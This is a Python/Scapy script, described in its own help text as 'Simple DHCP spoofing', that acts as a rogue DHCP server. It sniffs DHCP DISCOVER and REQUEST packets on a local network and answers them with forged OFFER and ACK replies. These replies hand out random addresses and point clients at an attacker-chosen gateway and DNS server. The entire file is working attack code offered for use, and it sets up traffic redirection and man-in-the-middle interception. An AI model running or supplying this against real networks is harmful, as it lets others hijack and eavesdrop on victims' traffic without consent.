#! /usr/bin/python3

from colorama import Fore, Style, init
from scapy.all import *

import argparse
import sys
import ipaddress
import random

init(autoreset=True)  # Automatically resets color after each print

def build_dhcp_ack(src_mac, dhcp_xid, client_requested_ip):
	# Ethernet header
	ethernet = Ether(src=get_if_hwaddr(args.iface), dst=src_mac)
	# IP header
	ip = IP(src=get_if_addr(args.iface), dst="255.255.255.255")
	# UDP header
	udp = UDP(sport=67, dport=68)
	# BOOTP header
	"""
	op=2	: means it's a reply (1 would be a request).
	yiaddr  : “Your IP address” – the IP being offered to the client.
	siaddr  : “Server IP address” – the fake DHCP server’s IP.
	chaddr  : client hardware address (MAC), converted to raw format.
	xid     : transaction ID to match the client’s request."""
	bootp = BOOTP(op=2, yiaddr=client_requested_ip, siaddr=get_if_addr(args.iface), chaddr=mac2str(src_mac), xid=dhcp_xid)
	# DHCP header
	dhcp = DHCP(options=[
		("message-type", "ack"),
		("server_id", get_if_addr(args.iface)),
		("subnet_mask", netmask),
		("router", args.gateway),
		("name_server", args.dns),
		("lease_time", 43200),
		"end"])

	return ethernet / ip / udp / bootp / dhcp

def build_dhcp_offer(src_mac, dhcp_xid):
	# Ethernet header
	ethernet = Ether(src=get_if_hwaddr(args.iface), dst=src_mac)
	# IP header
	ip = IP(src=get_if_addr(args.iface), dst="255.255.255.255")
	# UDP header
	udp = UDP(sport=67, dport=68)
	# BOOTP header
	"""
	op=2	: means it's a reply (1 would be a request).
	yiaddr  : “Your IP address” – the IP being offered to the client.
	siaddr  : “Server IP address” – the fake DHCP server’s IP.
	chaddr  : client hardware address (MAC), converted to raw format.
	xid     : transaction ID to match the client’s request."""
	bootp = BOOTP(op=2, yiaddr=random_ipaddr, siaddr=get_if_addr(args.iface), chaddr=mac2str(src_mac), xid=dhcp_xid)
	# DHCP header
	dhcp = DHCP(options=[
		("message-type", "offer"),
		("server_id", get_if_addr(args.iface)),
		("subnet_mask", netmask),
		("router", args.gateway),
		("name_server", args.dns),
		("lease_time", 43200),
		"end"])

	return ethernet / ip / udp / bootp / dhcp
	

def packet_handler(packets):
	# Ensure it's a DHCP packet
	if packets.haslayer(DHCP):
		""" Extracting the DHCP message type from the packet
		1	Discover
		2	Offer
		3	Request
		4	Decline
		5	ACK
		6	NAK
		7	Release
		8	Inform"""

		dhcp_packet_type = packets[DHCP].options[0][1]
		# Get intel
		dhcp_transaction_id = packets[BOOTP].xid
		sender_mac_addr = packets[Ether].src

		# Checks DHCP type to ensure it's a DHCP DISCOVER packet
		if dhcp_packet_type == 1:
			try:
				dhcp_offer = build_dhcp_offer(sender_mac_addr, dhcp_transaction_id)
			except Exception as build_dhcp_offer_error:
				print(f"{Fore.RED}[x] Building DHCP OFFER faield with error: {build_dhcp_offer_error}")
				sys.exit(0)
			try:
				sendp(dhcp_offer, args.iface, verbose=0)
				print(f"{Fore.YELLOW}DHCP DISCOVER from {Fore.GREEN}{sender_mac_addr} ---> {Fore.YELLOW}DHCP OFFER SENT")
			except Exception as send_dhcp_offer_error:
				print(f"{Fore.RED}[x] Sending DHCP OFFER faield with error: {send_dhcp_offer_error}")
				sys.exit(0)

		# Checks DHCP type to ensure it's a DHCP REQUEST packet
		if dhcp_packet_type == 3:
			try:
				client_requested_ip = random_ipaddr
				dhcp_ack = build_dhcp_ack(sender_mac_addr, dhcp_transaction_id, client_requested_ip)
			except Exception as build_dhcp_ack_error:
				print(f"{Fore.RED}[x] Building DHCP ACK faield with error: {build_dhcp_ack_error}")
				sys.exit(0)
			try:
				sendp(dhcp_ack, args.iface, verbose=0)
				print(f"{Fore.YELLOW}DHCP REQUEST from {Fore.GREEN}{sender_mac_addr} ---> {Fore.YELLOW}DHCP ACK SENT (IP: {client_requested_ip})")
			except Exception as send_dhcp_ack_error:
				print(f"{Fore.RED}[x] Sending DHCP ACK faield with error: {send_dhcp_ack_error}")
				sys.exit(0)

def packet_sniffer():
	print(f"{Fore.CYAN}[*] Sniffing DHCP packets...\n")
	# Use prn= inside sniff() to process each packet as it's captured.
	# Use store=False in sniff() to avoid storing packets in memory unnecessarily.
	# sniff() only allows prn to be a function that takes one argument: the packet. To work around this, you can use a lambda function to pass additional arguments to your packet handler.
	# udp and (port 67 or 68): Sniff all DHCP packets
	packet = sniff(iface=args.iface, filter="udp and (port 67 or 68)", prn=packet_handler, store=False)

def network_calculation(cidr):
	# Define a network using CIDR notation
	network = ipaddress.IPv4Network(cidr)

	# Getting the subnet mask
	subnetmask = network.netmask

	# Get all usable hosts (excludes network and broadcast)
	hosts = list(network.hosts())

	# Pick a random IP address
	random_ip = random.choice(hosts)

	return str(subnetmask), str(random_ip)



# Create parser object
parser = argparse.ArgumentParser(description="Simple DHCP spoofing with Scapy", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

# Add arguments
parser.add_argument("-i", "--iface", metavar="", default="eth0", help="Network interface")
parser.add_argument("-g", "--gateway", metavar="", default="192.168.1.1", help="Network gateway")
parser.add_argument("-d", "--dns", metavar="", default="192.168.1.1", help="Network dns server")
parser.add_argument("-r", "--range", metavar="", default="192.168.1.0/24", help="Network ip address range")

# Use arguments
args = parser.parse_args()

# Get subnet mask from CIDR and generate random ip address
netmask, random_ipaddr = network_calculation(args.range)

# Sniff DHCP packets
try:
	packet_sniffer()
except KeyboardInterrupt:
	print(f"\n{Fore.RED}[x] Sniffing stopped by user. (CTRL+C was detected)")
	sys.exit(0)
